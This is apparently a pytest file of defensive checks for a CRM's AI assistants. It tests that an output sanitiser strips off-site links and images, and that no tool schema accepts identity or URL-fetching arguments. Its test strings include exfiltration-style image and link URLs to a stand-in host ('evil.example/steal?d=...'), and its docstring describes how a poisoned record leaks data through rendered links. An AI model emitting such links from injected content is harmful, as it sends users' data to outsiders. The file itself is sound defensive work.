"""Defences at the exit and in the tools (ADR 0018, step VA2), as pure checks.

What an AI writes may not carry a link to another site or an image (that is how a poisoned
record sends data out), and no tool may take an identity or fetch an address."""

from typing import Any

import pytest

from app.modules.assistant import guardrails, staff_tools
from app.modules.assistant import tools as portal_tools
from app.modules.public_chat import rules as chat_rules

# --- the exit: what an answer may contain -------------------------------------------------------


def test_an_image_in_an_answer_is_removed() -> None:
    out = guardrails.sanitise_output("Done. ![x](https://evil.example/p.png?d=secret) Thanks.")
    assert "evil.example" not in out and "![" not in out and "[image removed]" in out


def test_a_markdown_link_to_another_site_is_removed_but_its_words_stay() -> None:
    out = guardrails.sanitise_output("See [your invoice](https://evil.example/?q=1).")
    assert "evil.example" not in out and "your invoice" in out and "[link removed]" in out


def test_a_bare_address_and_an_html_image_are_removed() -> None:
    out = guardrails.sanitise_output('Go to https://evil.example/a or <img src="http://e.io/x">')
    assert "evil.example" not in out and "e.io" not in out


def test_a_link_inside_the_crm_stays() -> None:
    text = "Open [the lead](/leads/3f2a) to see it."
    assert guardrails.sanitise_output(text) == text


def test_plain_answers_are_unchanged() -> None:
    text = "Your order ORD-12 ships on Friday. The total is 1,200.50."
    assert guardrails.sanitise_output(text) == text


def test_secrets_are_still_refused_after_cleaning() -> None:
    assert guardrails.sanitise_output("my system prompt: ...") == guardrails.SAFE_OUTPUT


def test_an_answer_that_is_only_a_link_is_not_left_empty_looking() -> None:
    out = guardrails.sanitise_output("https://evil.example/steal?d=1")
    assert "evil.example" not in out and out.strip()


# --- the tools: no identity argument, no fetching ------------------------------------------------

FORBIDDEN_IDENTITY = {
    "tenant_id", "user_id", "requested_by", "requested_by_id", "actor", "actor_id", "email",
    "username", "role", "roles", "permission", "permissions", "principal", "on_behalf_of",
    "created_by", "approver_id", "approved_by",
}  # fmt: skip
# The only ids a tool may name are the TARGET of a change; the service checks them like any
# other client-supplied id.
ALLOWED_TARGETS = {
    ("propose_lead_assignment", "owner_id"),
    ("propose_follow_up_task", "assignee_id"),
}
FETCHING = {"url", "uri", "href", "link", "endpoint", "webhook", "address", "host", "domain"}


def _catalogues() -> dict[str, list[dict[str, Any]]]:
    return {
        "staff": staff_tools.definitions(),
        "portal": portal_tools.definitions(),
        "public_chat": [chat_rules.SAVE_LEAD_TOOL],
    }


def _walk(schema: Any) -> list[tuple[str, dict[str, Any]]]:
    """Every property of a JSON schema, nested ones included."""
    found: list[tuple[str, dict[str, Any]]] = []
    if isinstance(schema, dict):
        for name, sub in (schema.get("properties") or {}).items():
            found.append((name, sub))
            found += _walk(sub)
        for key in ("items", "$defs", "anyOf", "allOf", "oneOf"):
            inner = schema.get(key)
            if isinstance(inner, dict) and key == "$defs":
                for sub in inner.values():
                    found += _walk(sub)
            else:
                found += _walk(inner)
    elif isinstance(schema, list):
        for sub in schema:
            found += _walk(sub)
    return found


def _tools() -> list[tuple[str, str, dict[str, Any]]]:
    return [(agent, t["name"], t) for agent, tools in _catalogues().items() for t in tools]


@pytest.mark.parametrize(("agent", "name", "tool"), _tools())
def test_no_tool_takes_an_identity(agent: str, name: str, tool: dict[str, Any]) -> None:
    """Who is asking comes only from the verified token, never from what a model sends."""
    for prop, _ in _walk(tool["input_schema"]):
        if prop in FORBIDDEN_IDENTITY:
            # The public chat's visitor e-mail is the lead's contact detail, not an identity.
            assert (agent, name, prop) == ("public_chat", "save_lead", "email"), (name, prop)
        if prop.endswith("_id") and prop not in {"order_id", "ticket_id", "invoice_id"}:
            assert (name, prop) in ALLOWED_TARGETS or prop in TARGET_RECORD_IDS, (name, prop)


TARGET_RECORD_IDS = {"lead_id", "account_id", "contact_id", "quote_id", "target_id", "record_id"}


@pytest.mark.parametrize(("agent", "name", "tool"), _tools())
def test_no_tool_accepts_unknown_arguments(agent: str, name: str, tool: dict[str, Any]) -> None:
    assert tool["input_schema"].get("additionalProperties") is False, name


@pytest.mark.parametrize(("agent", "name", "tool"), _tools())
def test_no_tool_fetches_an_address(agent: str, name: str, tool: dict[str, Any]) -> None:
    """A tool that fetched a URL would let a poisoned record send data out."""
    for prop, sub in _walk(tool["input_schema"]):
        assert prop.lower() not in FETCHING, (name, prop)
        assert sub.get("format") not in {"uri", "uri-reference", "url"}, (name, prop)
    for word in ("fetch", "browse", "http", "download", "crawl", "scrape", "webhook"):
        assert word not in name.lower(), name


def test_every_assistant_has_tools_to_check() -> None:
    cats = _catalogues()
    assert len(cats["staff"]) >= 7 and len(cats["portal"]) >= 8 and len(cats["public_chat"]) == 1
